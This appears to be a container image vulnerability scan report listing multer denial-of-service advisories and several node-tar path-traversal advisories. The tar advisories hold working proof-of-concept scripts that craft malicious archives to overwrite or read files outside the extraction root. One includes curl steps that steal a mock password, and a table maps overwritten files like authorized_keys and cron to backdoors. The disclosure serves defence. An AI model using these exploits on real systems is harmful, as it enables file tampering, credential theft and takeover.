## :mag: Vulnerabilities of `nodejs-2026q1-knowledge-hub-knowledge-hub:latest`

:package: Image Reference `nodejs-2026q1-knowledge-hub-knowledge-hub:latest`


|                 |                                                                           |
| --------------- | ------------------------------------------------------------------------- |
| digest          | `sha256:6bca342c1c87990a3d5db95d32dda05e8b75df7aca22321cd65b898f72ed7e9c` |
|                 |                                                                           |
| vulnerabilities |                                                                           |
| platform        | linux/arm64                                                               |
| size            | 83 MB                                                                     |
| packages        | 406                                                                       |



|                                |
| ------------------------------ |
| **multer** `1.4.4-lts.1` (npm) |


`pkg:npm/multer@1.4.4-lts.1`

*Uncontrolled Recursion*


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `<2.1.1`                                                          |
| Fixed version   | `2.1.1`                                                           |
| CVSS Score      | `8.7`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |
| EPSS Score      | `0.064%`                                                          |
| EPSS Percentile | `20th percentile`                                                 |


Description



### Impact

A vulnerability in Multer versions < 2.1.1 allows an attacker to trigger a Denial of Service (DoS) by sending malformed requests, potentially causing stack overflow.

### Patches

Users should upgrade to `2.1.1`

### Workarounds

None

### Resources

- [https://github.com/expressjs/multer/security/advisories/GHSA-5528-5vmv-3xc2](https://github.com/expressjs/multer/security/advisories/GHSA-5528-5vmv-3xc2)
- [https://www.cve.org/CVERecord?id=CVE-2026-3520](https://www.cve.org/CVERecord?id=CVE-2026-3520)
- [https://github.com/expressjs/multer/commit/7e66481f8b2e6c54b982b34c152479e096ce2752](https://github.com/expressjs/multer/commit/7e66481f8b2e6c54b982b34c152479e096ce2752)
- [https://cna.openjsf.org/security-advisories.html](https://cna.openjsf.org/security-advisories.html)
  _Incomplete Cleanup_


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `<2.1.0`                                                          |
| Fixed version   | `2.1.0`                                                           |
| CVSS Score      | `8.7`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |
| EPSS Score      | `0.018%`                                                          |
| EPSS Percentile | `5th percentile`                                                  |


Description



### Impact

A vulnerability in Multer versions < 2.1.0 allows an attacker to trigger a Denial of Service (DoS) by sending malformed requests, potentially causing resource exhaustion.

### Patches

Users should upgrade to `2.1.0`

### Workarounds

None

*Missing Release of Resource after Effective Lifetime*


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `<2.1.0`                                                          |
| Fixed version   | `2.1.0`                                                           |
| CVSS Score      | `8.7`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |
| EPSS Score      | `0.018%`                                                          |
| EPSS Percentile | `5th percentile`                                                  |


Description



### Impact

A vulnerability in Multer versions < 2.1.0 allows an attacker to trigger a Denial of Service (DoS) by dropping connection during file upload, potentially causing resource exhaustion.

### Patches

Users should upgrade to `2.1.0`

### Workarounds

None

*Uncaught Exception*


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `>=1.4.4-lts.1` `<2.0.1`                                          |
| Fixed version   | `2.0.1`                                                           |
| CVSS Score      | `8.7`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |
| EPSS Score      | `0.249%`                                                          |
| EPSS Percentile | `48th percentile`                                                 |


Description



### Impact

A vulnerability in Multer versions >=1.4.4-lts.1, <2.0.1 allows an attacker to trigger a Denial of Service (DoS) by sending an upload file request with an empty string field name. This request causes an unhandled exception, leading to a crash of the process.

### Patches

Users should upgrade to `2.0.1`

### Workarounds

None

### References

[https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9](https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9)
[https://github.com/expressjs/multer/issues/1233](https://github.com/expressjs/multer/issues/1233)
[https://github.com/expressjs/multer/pull/1256](https://github.com/expressjs/multer/pull/1256)

*Uncaught Exception*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=1.4.4-lts.1` `<2.0.2`                       |
| Fixed version   | `2.0.2`                                        |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.013%`                                       |
| EPSS Percentile | `2nd percentile`                               |


Description



### Impact

A vulnerability in Multer versions >= 1.4.4-lts.1, < 2.0.2 allows an attacker to trigger a Denial of Service (DoS) by sending a malformed request. This request causes an unhandled exception, leading to a crash of the process.

### Patches

Users should upgrade to `2.0.2`

### Workarounds

None

*Uncaught Exception*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=1.4.4-lts.1` `<2.0.0`                       |
| Fixed version   | `2.0.0`                                        |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.041%`                                       |
| EPSS Percentile | `12th percentile`                              |


Description



### Impact

A vulnerability in Multer versions >=1.4.4-lts.1 allows an attacker to trigger a Denial of Service (DoS) by sending a malformed multi-part upload request. This request causes an unhandled exception, leading to a crash of the process.

### Patches

Users should upgrade to `2.0.0`

### Workarounds

None

### References

- [https://github.com/expressjs/multer/issues/1176](https://github.com/expressjs/multer/issues/1176)
- [https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665](https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665)
  _Missing Release of Memory after Effective Lifetime_


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `<2.0.0`                                       |
| Fixed version   | `2.0.0`                                        |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.177%`                                       |
| EPSS Percentile | `39th percentile`                              |


Description



### Impact

Multer <2.0.0 is vulnerable to a resource exhaustion and memory leak issue due to improper stream handling. When the HTTP request stream emits an error, the internal `busboy` stream is not closed, violating Node.js stream safety guidance.

This leads to unclosed streams accumulating over time, consuming memory and file descriptors. Under sustained or repeated failure conditions, this can result in denial of service, requiring manual server restarts to recover. All users of Multer handling file uploads are potentially impacted.

### Patches

Users should upgrade to `2.0.0`

### Workarounds

None

### References

- [https://github.com/expressjs/multer/pull/1120](https://github.com/expressjs/multer/pull/1120)
- [https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665](https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665)

**tar** `6.2.1` (npm)

`pkg:npm/tar@6.2.1`

*Improper Handling of Unicode Encoding*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `<=7.5.3`                                      |
| Fixed version   | `7.5.4`                                        |
| CVSS Score      | `8.8`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L` |
| EPSS Score      | `0.008%`                                       |
| EPSS Percentile | `1st percentile`                               |


Description



**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS

**AUTHOR**: Tomás Illuminati

### Details

A race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.

```typescript
// node-tar/src/path-reservations.ts (Lines 53-62)
reserve(paths: string[], fn: Handler) {
    paths =
      isWindows ?
        ['win32 parallelization disabled']
      : paths.map(p => {
          return stripTrailingSlashes(
            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS
          ).toLowerCase()
        })

```

In MacOS the `join(normalizeUnicode(p)),` FS confuses ß with ss, but this code does not. For example:

```bash
bash-3.2$ printf "CONTENT_SS\n" > collision_test_ss
bash-3.2$ ls
collision_test_ss
bash-3.2$ printf "CONTENT_ESSZETT\n" > collision_test_ß
bash-3.2$ ls -la
total 8
drwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .
drwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..
-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss
bash-3.2$
```

---

### PoC

```javascript
const tar = require('tar');
const fs = require('fs');
const path = require('path');
const { PassThrough } = require('stream');

const exploitDir = path.resolve('race_exploit_dir');
if (fs.existsSync(exploitDir))
  fs.rmSync(exploitDir, { recursive: true, force: true });
fs.mkdirSync(exploitDir);

console.log('[*] Testing...');
console.log(`[*] Extraction target: ${exploitDir}`);

// Construct stream
const stream = new PassThrough();

const contentA = 'A'.repeat(1000);
const contentB = 'B'.repeat(1000);

// Key 1: "f_ss"
const header1 = new tar.Header({
  path: 'collision_ss',
  mode: 0o644,
  size: contentA.length,
});
header1.encode();

// Key 2: "f_ß"
const header2 = new tar.Header({
  path: 'collision_ß',
  mode: 0o644,
  size: contentB.length,
});
header2.encode();

// Write to stream
stream.write(header1.block);
stream.write(contentA);
stream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding

stream.write(header2.block);
stream.write(contentB);
stream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding

// End
stream.write(Buffer.alloc(1024));
stream.end();

// Extract
const extract = new tar.Unpack({
  cwd: exploitDir,
  // Ensure jobs is high enough to allow parallel processing if locks fail
  jobs: 8,
});

stream.pipe(extract);

extract.on('end', () => {
  console.log('[*] Extraction complete');

  // Check what exists
  const files = fs.readdirSync(exploitDir);
  console.log('[*] Files in exploit dir:', files);
  files.forEach((f) => {
    const p = path.join(exploitDir, f);
    const stat = fs.statSync(p);
    const content = fs.readFileSync(p, 'utf8');
    console.log(
      `File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`,
    );
  });

  if (
    files.length === 1 ||
    (files.length === 2 &&
      fs.statSync(path.join(exploitDir, files[0])).ino ===
        fs.statSync(path.join(exploitDir, files[1])).ino)
  ) {
    console.log('\[*] GOOD');
  } else {
    console.log('[-] No collision');
  }
});
```

---

### Impact

This is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.

---

### Remediation

Update `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.

Users who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.

---

*Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')*


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `<=7.5.10`                                                        |
| Fixed version   | `7.5.11`                                                          |
| CVSS Score      | `8.2`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N` |
| EPSS Score      | `0.007%`                                                          |
| EPSS Percentile | `0th percentile`                                                  |


Description



### Summary

`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details

The extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.

What happens with `linkpath: "C:../../../target.txt"`:

1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.
2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.
3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.
4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC

Tested on Arch Linux with `tar@<!-- -->7.5.10`.

PoC script (`poc.cjs`):

```js
const fs = require('fs');
const path = require('path');
const { Header, x } = require('tar');

const cwd = process.cwd();
const target = path.resolve(cwd, '..', 'target.txt');
const tarFile = path.join(cwd, 'poc.tar');

fs.writeFileSync(target, 'ORIGINAL\n');

const b = Buffer.alloc(1536);
new Header({
  path: 'a/b/l',
  type: 'SymbolicLink',
  linkpath: 'C:../../../target.txt',
}).encode(b, 0);
fs.writeFileSync(tarFile, b);

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\n');
  process.stdout.write(fs.readFileSync(target, 'utf8'));
});
```

Run:

```bash
node poc.cjs && readlink a/b/l && ls -l a/b/l ../target.txt
```

Observed output:

```text
PWNED
../../../target.txt
lrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -> ../../../target.txt
.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt
```

`PWNED` confirms outside file content overwrite. `readlink` and `ls -l` confirm the extracted symlink points outside the extraction directory.

### Impact

This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:

- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files
  _Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')_


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `<=7.5.9`                                                         |
| Fixed version   | `7.5.10`                                                          |
| CVSS Score      | `8.2`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:L/SC:N/SI:H/SA:L` |
| EPSS Score      | `0.005%`                                                          |
| EPSS Percentile | `0th percentile`                                                  |


Description



### Summary

`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details

The extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.

What happens with `linkpath: "C:../target.txt"`:

1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.
2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.
3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.
4. Writing through the extracted hardlink overwrites the outside file.

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC

Tested on Arch Linux with `tar@<!-- -->7.5.9`.

PoC script (`poc.cjs`):

```js
const fs = require('fs');
const path = require('path');
const { Header, x } = require('tar');

const cwd = process.cwd();
const target = path.resolve(cwd, '..', 'target.txt');
const tarFile = path.join(process.cwd(), 'poc.tar');

fs.writeFileSync(target, 'ORIGINAL\n');

const b = Buffer.alloc(1536);
new Header({ path: 'l', type: 'Link', linkpath: 'C:../target.txt' }).encode(
  b,
  0,
);
fs.writeFileSync(tarFile, b);

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'l'), 'PWNED\n');
  process.stdout.write(fs.readFileSync(target, 'utf8'));
});
```

Run:

```bash
cd test-workspace
node poc.cjs && ls -l ../target.txt
```

Observed output:

```text
PWNED
-rw-r--r-- 2 joshuavr joshuavr 6 Mar  4 19:25 ../target.txt
```

`PWNED` confirms outside file content overwrite. Link count `2` confirms the extracted file and `../target.txt` are hardlinked.

### Impact

This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:

- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files
  _Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')_


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `<7.5.7`                                       |
| Fixed version   | `7.5.7`                                        |
| CVSS Score      | `8.2`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` |
| EPSS Score      | `0.021%`                                       |
| EPSS Percentile | `6th percentile`                               |


Description



### Summary

node-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.

### Details

The vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:

**Security check in `[STRIPABSOLUTEPATH]`:**

```javascript
const entryDir = path.posix.dirname(entry.path);
const resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));
if (resolved.startsWith('../')) {
  /* block */
}
```

**Hardlink creation in `[HARDLINK]`:**

```javascript
const linkpath = path.resolve(this.cwd, entry.linkpath);
fs.linkSync(linkpath, dest);
```

**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.

- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.
- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.

The security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.

### PoC

#### Setup

Create a new directory with these files:

```
poc/
├── package.json
├── secret.txt          ← sensitive file (target)
├── server.js           ← vulnerable server
├── create-malicious-tar.js
├── verify.js
└── uploads/            ← created automatically by server.js
    └── (extracted files go here)
```

**package.json**

```json
{ "dependencies": { "tar": "^7.5.0" } }
```

**secret.txt** (sensitive file outside uploads/)

```
DATABASE_PASSWORD=supersecret123
```

**server.js** (vulnerable file upload server)

```javascript
const http = require('http');
const fs = require('fs');
const path = require('path');
const tar = require('tar');

const PORT = 3000;
const UPLOAD_DIR = path.join(__dirname, 'uploads');
fs.mkdirSync(UPLOAD_DIR, { recursive: true });

http
  .createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/upload') {
      const chunks = [];
      req.on('data', (c) => chunks.push(c));
      req.on('end', async () => {
        fs.writeFileSync(
          path.join(UPLOAD_DIR, 'upload.tar'),
          Buffer.concat(chunks),
        );
        await tar.extract({
          file: path.join(UPLOAD_DIR, 'upload.tar'),
          cwd: UPLOAD_DIR,
        });
        res.end('Extracted\n');
      });
    } else if (req.method === 'GET' && req.url === '/read') {
      // Simulates app serving extracted files (e.g., file download, static assets)
      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
      if (fs.existsSync(targetPath)) {
        res.end(fs.readFileSync(targetPath));
      } else {
        res.end('File not found\n');
      }
    } else if (req.method === 'POST' && req.url === '/write') {
      // Simulates app writing to extracted file (e.g., config update, log append)
      const chunks = [];
      req.on('data', (c) => chunks.push(c));
      req.on('end', () => {
        const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
        if (fs.existsSync(targetPath)) {
          fs.writeFileSync(targetPath, Buffer.concat(chunks));
          res.end('Written\n');
        } else {
          res.end('File not found\n');
        }
      });
    } else {
      res.end('POST /upload, GET /read, or POST /write\n');
    }
  })
  .listen(PORT, () => console.log(`http://localhost:${PORT}`));
```

**create-malicious-tar.js** (attacker creates exploit TAR)

```javascript
const fs = require('fs');

function tarHeader(name, type, linkpath = '', size = 0) {
  const b = Buffer.alloc(512, 0);
  b.write(name, 0);
  b.write('0000644', 100);
  b.write('0000000', 108);
  b.write('0000000', 116);
  b.write(size.toString(8).padStart(11, '0'), 124);
  b.write(
    Math.floor(Date.now() / 1000)
      .toString(8)
      .padStart(11, '0'),
    136,
  );
  b.write('        ', 148);
  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;
  if (linkpath) b.write(linkpath, 157);
  b.write('ustar\x00', 257);
  b.write('00', 263);
  let sum = 0;
  for (let i = 0; i < 512; i++) sum += b[i];
  b.write(sum.toString(8).padStart(6, '0') + '\x00 ', 148);
  return b;
}

// Hardlink escapes to parent directory's secret.txt
fs.writeFileSync(
  'malicious.tar',
  Buffer.concat([
    tarHeader('d/', 'dir'),
    tarHeader('d/x', 'link', '../secret.txt'),
    Buffer.alloc(1024),
  ]),
);
console.log('Created malicious.tar');
```

#### Run

```bash
# Setup
npm install
echo "DATABASE_PASSWORD=supersecret123" > secret.txt

# Terminal 1: Start server
node server.js

# Terminal 2: Execute attack
node create-malicious-tar.js
curl -X POST --data-binary @<!-- -->malicious.tar http://localhost:3000/upload

# READ ATTACK: Steal secret.txt content via the hardlink
curl http://localhost:3000/read
# Returns: DATABASE_PASSWORD=supersecret123

# WRITE ATTACK: Overwrite secret.txt through the hardlink
curl -X POST -d "PWNED" http://localhost:3000/write

# Confirm secret.txt was modified
cat secret.txt
```

### Impact

An attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:

**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.

**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.

### Remote Code Execution / Server Takeover


| Attack Vector    | Target File                            | Result                            |
| ---------------- | -------------------------------------- | --------------------------------- |
| SSH Access       | `~/.ssh/authorized_keys`               | Direct shell access to server     |
| Cron Backdoor    | `/etc/cron.d/`, `~/.crontab`           | Persistent code execution         |
| Shell RC Files   | `~/.bashrc`, `~/.profile`              | Code execution on user login      |
| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests    |
| Systemd Services | `/etc/systemd/system/*.service`        | Code execution on service restart |
| User Creation    | `/etc/passwd` (if running as root)     | Add new privileged user           |


## Data Exfiltration & Corruption

1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations
2. **Read sensitive files** by creating hardlinks that point outside extraction directory
3. **Corrupt databases** and application state
4. **Steal credentials** from config files, `.env`, secrets

*Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')*


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `<=7.5.2`                                                         |
| Fixed version   | `7.5.3`                                                           |
| CVSS Score      | `8.2`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N` |
| EPSS Score      | `0.007%`                                                          |
| EPSS Percentile | `1st percentile`                                                  |


Description



### Summary

The `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.

### Details

The vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.

**1. Hardlink Escape (Arbitrary File Overwrite)**

The extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.

The library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.

**2. Symlink Poisoning**

The extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.

### PoC

The following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local "secret" file was successfully overwritten.

```javascript
const fs = require('fs');
const path = require('path');
const tar = require('tar');

const out = path.resolve('out_repro');
const secret = path.resolve('secret.txt');
const tarFile = path.resolve('exploit.tar');
const targetSym = '/etc/passwd';

// Cleanup & Setup
try {
  fs.rmSync(out, { recursive: true, force: true });
  fs.unlinkSync(secret);
} catch {}
fs.mkdirSync(out);
fs.writeFileSync(secret, 'ORIGINAL_DATA');

// 1. Craft malicious Link header (Hardlink to absolute local file)
const h1 = new tar.Header({
  path: 'exploit_hard',
  type: 'Link',
  size: 0,
  linkpath: secret,
});
h1.encode();

// 2. Craft malicious Symlink header (Symlink to /etc/passwd)
const h2 = new tar.Header({
  path: 'exploit_sym',
  type: 'SymbolicLink',
  size: 0,
  linkpath: targetSym,
});
h2.encode();

// Write binary tar
fs.writeFileSync(
  tarFile,
  Buffer.concat([h1.block, h2.block, Buffer.alloc(1024)]),
);

console.log('[*] Extracting malicious tarball...');

// 3. Extract with default secure settings
tar
  .x({
    cwd: out,
    file: tarFile,
    preservePaths: false,
  })
  .then(() => {
    console.log('[*] Verifying payload...');

    // Test Hardlink Overwrite
    try {
      fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN');

      if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {
        console.log('[+] VULN CONFIRMED: Hardlink overwrite successful');
      } else {
        console.log('[-] Hardlink failed');
      }
    } catch (e) {}

    // Test Symlink Poisoning
    try {
      if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {
        console.log('[+] VULN CONFIRMED: Symlink points to absolute path');
      } else {
        console.log('[-] Symlink failed');
      }
    } catch (e) {}
  });
```

### Impact

- **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.
- **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)
  _Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')_


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `<7.5.8`                                       |
| Fixed version   | `7.5.8`                                        |
| CVSS Score      | `7.1`                                          |
| CVSS Vector     | `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` |
| EPSS Score      | `0.007%`                                       |
| EPSS Percentile | `1st percentile`                               |


Description



### Summary

`tar.extract()` in Node `tar` allows an attacker-controlled archive to create a hardlink inside the extraction directory that points to a file outside the extraction root, using default options.

This enables **arbitrary file read and write** as the extracting user (no root, no chmod, no `preservePaths`).

Severity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive.

### Details

The bypass chain uses two symlinks plus one hardlink:

1. `a/b/c/up -> ../..`
2. `a/b/escape -> c/up/../..`
3. `exfil` (hardlink) -> `a/b/escape/<target-relative-to-parent-of-extract>`

Why this works:

- Linkpath checks are string-based and do not resolve symlinks on disk for hardlink target safety.
  - See `STRIPABSOLUTEPATH` logic in:
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:255`
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:268`
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:281`
- Hardlink extraction resolves target as `path.resolve(cwd, entry.linkpath)` and then calls `fs.link(target, destination)`.
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:566`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:567`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:703`
- Parent directory safety checks (`mkdir` + symlink detection) are applied to the destination path of the extracted entry, not to the resolved hardlink target path.
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:617`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:619`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:27`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:101`

As a result, `exfil` is created inside extraction root but linked to an external file. The PoC confirms shared inode and successful read+write via `exfil`.

### PoC

[hardlink.js](https://github.com/user-attachments/files/25240082/hardlink.js)
Environment used for validation:

- Node: `v25.4.0`
- tar: `7.5.7`
- OS: macOS Darwin 25.2.0
- Extract options: defaults (`tar.extract({ file, cwd })`)

Steps:

1. Prepare/locate a `tar` module. If `require('tar')` is not available locally, set `TAR_MODULE` to an absolute path to a tar package directory.
2. Run:

```bash
TAR_MODULE="$(cd '../tar-audit-setuid - CVE/node_modules/tar' && pwd)" node hardlink.js
```

1. Expected vulnerable output (key lines):

```text
same_inode=true
read_ok=true
write_ok=true
result=VULNERABLE
```

Interpretation:

- `same_inode=true`: extracted `exfil` and external secret are the same file object.
- `read_ok=true`: reading `exfil` leaks external content.
- `write_ok=true`: writing `exfil` modifies external file.

### Impact

Vulnerability type:

- Arbitrary file read/write via archive extraction path confusion and link resolution.

Who is impacted:

- Any application/service that extracts attacker-controlled tar archives with Node `tar` defaults.
- Impact scope is the privileges of the extracting process user.

Potential outcomes:

- Read sensitive files reachable by the process user.
- Overwrite writable files outside extraction root.
